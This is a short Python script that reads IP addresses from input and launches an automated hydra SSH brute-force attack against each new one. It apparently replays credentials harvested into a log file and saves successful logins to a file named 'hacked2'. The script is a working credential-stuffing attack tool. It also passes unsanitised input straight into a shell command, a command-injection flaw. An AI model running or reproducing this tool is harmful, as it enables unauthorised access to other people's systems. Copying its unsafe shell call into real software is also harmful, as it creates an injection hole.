#!/usr/bin/env python3
import os
import sys

args = sys.argv[1:]
history = set()
while True:
	newIp = input()
	if not (newIp in history):
		history.add(newIp)
		os.system("sudo hydra -I -f -t 4 -C /var/log/contrSSH/logins.log -V -o /var/log/contrSSH/hacked2 ssh://" + newIp)
